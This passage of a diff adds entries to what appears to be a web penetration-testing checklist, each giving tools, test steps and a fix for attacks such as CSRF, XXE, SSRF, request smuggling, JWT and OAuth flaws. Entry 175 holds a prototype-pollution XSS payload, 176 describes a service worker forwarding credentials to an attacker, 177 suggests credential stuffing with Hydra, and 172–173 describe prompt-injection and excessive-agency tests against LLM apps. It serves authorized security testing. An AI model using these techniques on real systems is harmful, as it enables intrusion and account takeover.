+        "Confirm if action still succeeds, indicating bypass.",
+        "Recommend strict server-side token validation irrespective of method."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-131",
+      "title": "CSRF tokens not bound to session or duplicated in cookie",
+      "description": "Check if tokens are user-specific and not reusable across sessions.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Capture tokens from one session and replay in another.",
+        "Analyze tokens reflected both in cookies and request parameters.",
+        "Confirm predictability or replay success.",
+        "Recommend binding tokens to session and avoiding token-in-cookie patterns."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-132",
+      "title": "Bypassing SameSite restrictions",
+      "description": "Evaluate whether specific flows allow CSRF despite SameSite attributes.",
+      "tools": [
+        "Burp Suite",
+        "Browser"
+      ],
+      "steps": [
+        "Inspect cookie attributes (Lax, Strict, None).",
+        "Craft cross-site requests using method override, redirects, or sibling domains.",
+        "Confirm if protected action is still triggered.",
+        "Recommend correct SameSite configuration and CSRF tokens."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-133",
+      "title": "Bypassing referer-based CSRF defenses",
+      "description": "Test fragile reliance on Referer header for CSRF protection.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Trigger cross-site requests and monitor Referer behavior.",
+        "Omit or partially manipulate Referer to see if validation passes.",
+        "Highlight inconsistencies due to privacy features.",
+        "Recommend token-based CSRF prevention."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-134",
+      "title": "Basic clickjacking against CSRF-protected actions",
+      "description": "Check if critical actions can be framed and abused via UI redress.",
+      "tools": [
+        "Custom HTML page",
+        "Browser"
+      ],
+      "steps": [
+        "Create PoC page framing target site with opacity and overlayed controls.",
+        "Attempt to trigger sensitive actions via disguised clicks.",
+        "Verify if X-Frame-Options or CSP frame-ancestors is absent or weak.",
+        "Recommend frame restrictions and visual confirmation steps."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-135",
+      "title": "Clickjacking with prefilled form inputs / multistep flows",
+      "description": "Assess multi-step forms and prefilled data exploitable via framing.",
+      "tools": [
+        "Custom HTML page",
+        "Browser"
+      ],
+      "steps": [
+        "Frame each step and align click targets to drive victim through flow.",
+        "Check if state updates succeed without explicit visibility.",
+        "Document feasibility for high-risk operations.",
+        "Recommend per-step protections and re-auth for critical operations."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-136",
+      "title": "Bypassing frame-buster",
+      "description": "Test robustness of client-side frame-busting scripts.",
+      "tools": [
+        "Browser DevTools"
+      ],
+      "steps": [
+        "Analyze JS frame-busting logic in response.",
+        "Frame target within sandbox or override conditions to neutralize script.",
+        "Confirm whether page can still be clickjacked.",
+        "Recommend server-side X-Frame-Options/CSP instead of JS-only."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-137",
+      "title": "DOM XSS via web messages",
+      "description": "Assess postMessage handlers that trust unvalidated message sources or data.",
+      "tools": [
+        "Browser DevTools"
+      ],
+      "steps": [
+        "Locate message event listeners and inspect origin and data checks.",
+        "Send crafted messages from attacker-controlled origins or iframes.",
+        "Check if data is used in sinks (innerHTML, eval, location).",
+        "Recommend strict origin and data validation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-138",
+      "title": "DOM XSS via open redirection and JS URLs",
+      "description": "Check open redirect and JS URL handling in DOM logic.",
+      "tools": [
+        "Burp Suite",
+        "Browser"
+      ],
+      "steps": [
+        "Identify parameters controlling redirects or location assignments.",
+        "Inject external URLs and scripts and observe navigation.",
+        "Confirm potential phishing or XSS vectors.",
+        "Recommend strict whitelists and validation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-139",
+      "title": "DOM cookie manipulation",
+      "description": "Evaluate impact of client-side writable cookies on security.",
+      "tools": [
+        "Browser DevTools"
+      ],
+      "steps": [
+        "Identify scripts reading security decisions from cookies.",
+        "Attempt to modify those cookies to escalate privileges or bypass checks.",
+        "Document any successful misuse.",
+        "Recommend server-side enforcement and HttpOnly flags."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-140",
+      "title": "DOM clobbering leading to XSS or bypass",
+      "description": "Test if attacker-controlled element names/ids override critical DOM properties.",
+      "tools": [
+        "Browser DevTools"
+      ],
+      "steps": [
+        "Inject elements with conflicting IDs/names to override properties used in code.",
+        "Observe if security checks or sinks are altered.",
+        "Demonstrate resulting XSS or logic bypass.",
+        "Recommend robust element selection and avoiding name-based assumptions."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-141",
+      "title": "CORS basic origin reflection",
+      "description": "Check if Access-Control-Allow-Origin reflects arbitrary origins.",
+      "tools": [
+        "curl",
+        "Burp Suite"
+      ],
+      "steps": [
+        "Send requests with arbitrary Origin headers.",
+        "Verify if responses mirror Origin and include credentials.",
+        "Assess possibility of cross-origin theft via malicious site.",
+        "Recommend strict origin allowlists."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-142",
+      "title": "CORS null origin / HTTPS breakage",
+      "description": "Test unsafe acceptance of null origin or mixed-content CORS configs.",
+      "tools": [
+        "curl",
+        "Browser"
+      ],
+      "steps": [
+        "Send Origin: null and evaluate response headers.",
+        "Inspect HTTPS-only assumptions and downgrade risks.",
+        "Document misconfigurations enabling data exfiltration.",
+        "Recommend limited, explicit origins and TLS enforcement."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-143",
+      "title": "XXE to retrieve local files",
+      "description": "Assess XML parsers for external entity expansion reading local files.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Identify XML-based endpoints or uploads.",
+        "Submit payloads referencing local files using external entities.",
+        "Confirm if file content is reflected in responses.",
+        "Recommend disabling external entities and using secure parsers."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-144",
+      "title": "XXE for SSRF / OOB",
+      "description": "Check if XXE enables server-side requests and OOB exfiltration.",
+      "tools": [
+        "Burp Suite",
+        "Burp Collaborator"
+      ],
+      "steps": [
+        "Craft entities targeting internal services or collaborator domain.",
+        "Observe whether requests are issued or data included exfiltrated.",
+        "Constrain tests to in-scope endpoints.",
+        "Recommend disabling DTDs and outbound restrictions."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-145",
+      "title": "XXE via file upload, XInclude, parameter entities, repurposed DTD",
+      "description": "Probe indirect XXE vectors in uploads and complex XML processing.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Upload crafted XML-based files or embed XInclude elements.",
+        "Test parameter entities and external DTD references.",
+        "Monitor responses or OOB interactions.",
+        "Recommend robust parsing or alternative formats (JSON)."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-146",
+      "title": "Basic SSRF against localhost and backend",
+      "description": "Test URL-based features for SSRF to internal services.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Locate parameters that fetch remote URLs or resources.",
+        "Replace with localhost and internal IPs within scope.",
+        "Check responses or side effects for SSRF evidence.",
+        "Recommend strict allowlists and metadata blocking."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-147",
+      "title": "Blind SSRF with OOB / Shellshock",
+      "description": "Assess for blind SSRF and command injection via request headers.",
+      "tools": [
+        "Burp Suite",
+        "Burp Collaborator"
+      ],
+      "steps": [
+        "Send URLs pointing to collaborator and monitor for callbacks.",
+        "Test for Shellshock-style payloads only within lab systems.",
+        "Document reachable internal endpoints and impact.",
+        "Recommend filtering and isolation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-148",
+      "title": "CL.TE and TE.CL request smuggling detection",
+      "description": "Verify inconsistent Content-Length and Transfer-Encoding handling between front-end and back-end.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Construct requests with overlapping or conflicting length/TE headers.",
+        "Observe differential responses or desync behaviors.",
+        "Confirm ability to prepend or poison subsequent requests.",
+        "Recommend consistent parsing and RFC-compliant behavior."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-149",
+      "title": "Advanced request smuggling variants (H2, CL.0, CRLF, queue poisoning, tunneling, cache poisoning)",
+      "description": "Test advanced smuggling techniques across HTTP/1.1 and HTTP/2 and impact on routing and caches.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "For each supported protocol, craft minimal PoCs based on differing header interpretations.",
+        "Check if responses or cache entries show evidence of desync.",
+        "Assess ability to hijack requests, poison cache, or bypass access control.",
+        "Recommend standardized parsing and disabling ambiguous behaviors."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-150",
+      "title": "OS command injection, direct and blind",
+      "description": "Check parameters passed to OS-level commands for injection.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Identify endpoints performing system actions based on user input.",
+        "Inject control characters and command separators and observe responses or timing.",
+        "For blind, use time delays or OOB callbacks.",
+        "Recommend whitelisting, parameterization, and no direct shell invocation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-151",
+      "title": "Server-side template injection, basic and code context",
+      "description": "Test templating engines that render user-controlled input.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Detect template syntax reflections (`{{}}`, `<% %>`, etc.).",
+        "Submit harmless expressions to confirm evaluation.",
+        "In labs, escalate to controlled code execution to illustrate risk.",
+        "Recommend separating logic from templates and disabling eval."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-152",
+      "title": "File path traversal variants",
+      "description": "Check file retrieval endpoints for directory traversal using encodings and bypasses.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Probe file parameters with `../` sequences and URL/Unicode encodings.",
+        "Test null-byte and extension-bypass patterns when relevant.",
+        "Confirm ability to read restricted files within lab scope.",
+        "Recommend canonicalization and strict whitelisting."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-153",
+      "title": "Access control: unprotected and predictable admin functionality",
+      "description": "Identify admin interfaces exposed without proper authorization.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Discover admin URLs via browsing and brute forcing.",
+        "Access them as low-privilege or unauthenticated user.",
+        "Confirm missing authentication/authorization controls.",
+        "Recommend RBAC and hidden paths not as security control."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-154",
+      "title": "Access control: IDOR and parameter-based role control",
+      "description": "Test if changing user IDs or roles in parameters exposes other users' data or admin actions.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Intercept requests containing user IDs or roles.",
+        "Modify values to other identifiers and replay.",
+        "Confirm if cross-user data or admin functions become accessible.",
+        "Recommend server-side ownership checks and opaque IDs."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-155",
+      "title": "Access control: URL, method, referer-based, multi-step workflow gaps",
+      "description": "Identify flawed reliance on URL patterns, HTTP methods, referer, or missing checks in steps.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Access protected endpoints directly, alter methods, strip referer, or skip steps.",
+        "Confirm if security decisions break under altered paths.",
+        "Map each bypass with minimal PoC.",
+        "Recommend centralized authorization checks."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-156",
+      "title": "Username enumeration and weak brute-force protections",
+      "description": "Assess login-related endpoints for distinct responses and rate limits.",
+      "tools": [
+        "Burp Intruder"
+      ],
+      "steps": [
+        "Send login attempts with varying usernames and monitor messages, status codes, and timing.",
+        "Check for account lockout policies and weak multi-user attempts in one request.",
+        "Document any reliable enumeration vector.",
+        "Recommend uniform responses and robust rate limiting."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-157",
+      "title": "2FA weaknesses and bypass",
+      "description": "Test for logic flaws and predictable or brute-forceable OTPs.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Map full 2FA flow including verification endpoints.",
+        "Attempt reuse/skipping of 2FA steps, or direct access post-login.",
+        "Check OTP length, rate limits, and binding to session.",
+        "Recommend strong 2FA binding and controls."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-158",
+      "title": "Broken password reset and stay-logged-in mechanisms",
+      "description": "Assess reset tokens, remember-me cookies, and poisoning vectors.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Review token generation, lifetime, and invalidation.",
+        "Test predictable tokens, lack of binding to user/session, and poisoning of reset links.",
+        "Attempt offline cracking where hashes are exposed within lab.",
+        "Recommend secure token design and single-use semantics."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-159",
+      "title": "WebSocket message and handshake abuse",
+      "description": "Test WebSocket endpoints for auth trust, message tampering and CSWSH.",
+      "tools": [
+        "Burp Suite (WebSockets)"
+      ],
+      "steps": [
+        "Capture handshake to confirm origin and auth checks.",
+        "Modify messages to escalate privileges or access others' data.",
+        "Test cross-site initiation if cookies are sent.",
+        "Recommend strict auth and origin validation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-160",
+      "title": "Web cache poisoning variants",
+      "description": "Evaluate unkeyed headers/params and normalization issues enabling cache poisoning.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Identify cacheable endpoints and vary candidate unkeyed inputs (Host, X-Forwarded-*, cookies).",
+        "Observe if malicious variants are cached and served to others.",
+        "Map design vs implementation flaws.",
+        "Recommend strict cache keying and header validation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-161",
+      "title": "Insecure deserialization across languages",
+      "description": "Test endpoints handling serialized objects for tampering and RCE in lab context.",
+      "tools": [
+        "Burp Suite",
+        "Custom scripts"
+      ],
+      "steps": [
+        "Identify serialized data formats (Java, PHP, Ruby, etc.).",
+        "Modify fields to escalate roles or trigger gadget chains where provided.",
+        "Confirm effect limited to lab scope.",
+        "Recommend avoiding unsafe serialization formats."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-162",
+      "title": "Information disclosure via errors, backups, version control",
+      "description": "Check for sensitive data leakage through verbose errors and stray files.",
+      "tools": [
+        "Burp Suite",
+        "Dirbuster"
+      ],
+      "steps": [
+        "Trigger errors and read messages for stack traces and paths.",
+        "Bruteforce common backup and config filenames.",
+        "Check version-control directories for history leaks.",
+        "Recommend cleanup and generic error pages."
+      ],
+      "mcp_tools": [
+        "dirb"
+      ]
+    },
+    {
+      "id": "hiesen-web-testing-163",
+      "title": "Business logic flaws (trust, limits, workflow)",
+      "description": "Evaluate custom flows for trust on client, infinite balances, bypassed checks.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Model expected business rules per feature.",
+        "Tamper with prices, quantities, sequence, and flags.",
+        "Confirm if system enforces constraints server-side.",
+        "Recommend robust server-side validation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-164",
+      "title": "Host header attacks",
+      "description": "Test use of untrusted Host header for routing, password reset, and cache poisoning.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Alter Host header and observe effects on links, redirects, emails, and cache.",
+        "Check for SSRF or routing anomalies.",
+        "Document any password reset poisoning vectors.",
+        "Recommend strict host validation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-165",
+      "title": "OAuth misconfigurations and account takeover",
+      "description": "Assess OAuth flows for weak redirect_uri, state, forced linking, SSRF, and token theft.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Map full OAuth authorization and callback flow.",
+        "Attempt open redirect abuse, missing state, or arbitrary redirect_uri.",
+        "Test account linking logic for takeover paths.",
+        "Recommend strict parameter validation and state usage."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-166",
+      "title": "File upload to web shell / RCE",
+      "description": "Test file upload controls, extension bypass, and execution.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Upload benign files with varied extensions and content types.",
+        "Attempt polyglot, path traversal, or race-condition uploads within lab.",
+        "Confirm if execution or direct access is possible.",
+        "Recommend server-side validation and storage outside web root."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-167",
+      "title": "JWT authentication weaknesses",
+      "description": "Check JWT handling for unverified signatures, weak keys, alg confusion, and header abuse.",
+      "tools": [
+        "jwt_tool",
+        "Burp Suite"
+      ],
+      "steps": [
+        "Capture JWTs and inspect header, algorithm, and claims.",
+        "Test removal or modification of signature where verification is missing.",
+        "Attempt alg confusion and JWK/JKU/KID-based key injection where applicable.",
+        "Recommend robust verification and secure key management."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-168",
+      "title": "GraphQL misconfigurations",
+      "description": "Evaluate GraphQL endpoints for introspection, excessive data exposure, auth gaps, and CSRF.",
+      "tools": [
+        "Postman",
+        "Burp Suite"
+      ],
+      "steps": [
+        "Discover GraphQL endpoint and test introspection availability.",
+        "Enumerate types and fields for sensitive data.",
+        "Check auth on mutations and private queries.",
+        "Recommend disabled introspection in prod and proper auth."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-169",
+      "title": "Race condition exploitation",
+      "description": "Test concurrent requests for balance bypass, limit overrun, and partial write issues.",
+      "tools": [
+        "Burp Intruder"
+      ],
+      "steps": [
+        "Identify sensitive operations (transfers, coupons, inventory).",
+        "Send parallel requests manipulating same resource.",
+        "Observe inconsistent states or duplicated benefits.",
+        "Recommend locking and idempotent operations."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-170",
+      "title": "NoSQL injection detection and exploitation",
+      "description": "Assess JSON/NoSQL-based queries for operator and type injection.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Locate JSON request bodies and query-like parameters.",
+        "Inject operators or crafted objects to alter query logic.",
+        "Confirm unauthorized data access where possible in lab.",
+        "Recommend strict schema validation and type enforcement."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-171",
+      "title": "API-specific issues: unused endpoints, mass assignment, parameter pollution",
+      "description": "Map API surface and test for insecure features and misbinding.",
+      "tools": [
+        "Kiterunner",
+        "Burp Suite",
+        "Postman"
+      ],
+      "steps": [
+        "Enumerate endpoints via docs, wordlists, and traffic.",
+        "Test for mass assignment by sending extra fields.",
+        "Probe for server-side parameter pollution in query and path segments.",
+        "Recommend least-privilege fields and strict routing."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-172",
+      "title": "LLM API excessive agency and vulnerabilities",
+      "description": "Test LLM-integrated apps for unsafe tool access, OS command injection, and account actions.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Map how prompts are translated into backend tool/API calls.",
+        "Issue crafted instructions to trigger unintended actions (file ops, user management) inside lab.",
+        "Check guardrails and authorization enforcement.",
+        "Recommend strict tool whitelisting and policy layers."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-173",
+      "title": "Indirect prompt injection and insecure output handling",
+      "description": "Assess if external content can poison prompts and drive LLM to leak or execute unsafe actions.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Identify sources where attacker can control content consumed by LLM.",
+        "Embed instructions that conflict with system rules and observe behavior.",
+        "Verify if outputs are blindly executed or rendered as HTML/JS.",
+        "Recommend robust content isolation and validation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-174",
+      "title": "Web cache deception",
+      "description": "Check cache rules that cause sensitive pages to be cached as static.",
+      "tools": [
+        "Burp Suite"
+      ],
+      "steps": [
+        "Craft paths mixing static-looking suffixes with dynamic resources.",
+        "Observe if private content is cached and accessible unauthenticated.",
+        "Document exact patterns that trigger misbehavior.",
+        "Recommend proper cache-control and path handling."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-175",
+      "title": "Client-side prototype pollution to DOM XSS/RCE",
+      "description": "Detect prototype pollution sinks in modern JS frameworks (Vue, React, Angular) that can flip security-sensitive flags or inject scripts.",
+      "tools": [
+        "Burp Suite",
+        "Browser DevTools",
+        "custom JS payload"
+      ],
+      "steps": [
+        "Map JSON/URL parameters that are merged with objects (e.g., using _.merge or Object.assign) by reviewing prettified sources via DevTools.",
+        "Inject payloads such as `__proto__%5BinnerHTML%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E` or boolean flips and observe DOM changes.",
+        "Use Burp Suite Repeater or Turbo Intruder to fuzz for keys that land in security-critical settings (e.g., bypassing client-side auth checks, enabling debug routes).",
+        "Document exploitable flows and recommend strict schema validation plus deep copy utilities that avoid prototype mutation."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-176",
+      "title": "Service worker takeover and offline cache poisoning",
+      "description": "Assess whether untrusted origins can register or hijack a service worker to persistently control responses, exfiltrate data, or bypass CSP offline.",
+      "tools": [
+        "Burp Suite",
+        "Browser DevTools",
+        "wsproxy"
+      ],
+      "steps": [
+        "Enumerate service worker registrations via `chrome://serviceworker-internals` (or DevTools) and identify scope + script URL.",
+        "Check if the worker script is hosted on a cacheable endpoint lacking integrity/CSP; attempt to inject via stored XSS or misconfigured upload to replace the script.",
+        "Use Burp Suite to replay requests with modified script contents (e.g., adding fetch event handlers that proxy credentials to attacker).",
+        "Verify persistence after reload/offline switch and recommend strict scope, `service-worker-allowed`, integrity headers, and hard cache-busting deployments."
+      ],
+      "mcp_tools": []
+    },
+    {
+      "id": "hiesen-web-testing-177",
+      "title": "WebAuthn / passkey fallback downgrade",
+      "description": "Test whether applications that advertise WebAuthn/passkey can be forced back to weaker factors (password/OTP), enabling account takeover or MFA bypass.",
+      "tools": [
+        "Burp Suite",
+        "Browser DevTools",
+        "Hydra"
+      ],
+      "steps": [
+        "Instrument login/register flows to capture WebAuthn options and attestation requests.",
+        "Tamper with parameters (e.g., `authenticatorAttachment`, `userVerification`, `allowCredentials`) to force fallback to passwords or SMS while keeping the same session.",
+        "Attempt credential stuffing or password spraying via the weaker path (Hydra) once fallback is triggered, verifying session linkage.",
+        "Recommend enforcing WebAuthn on high-privilege roles, validating challenge parameters server-side, and rate-limiting fallback paths."
+      ],
+      "mcp_tools": [
+        "hydra"
+      ]
+    }
+  ]
+}
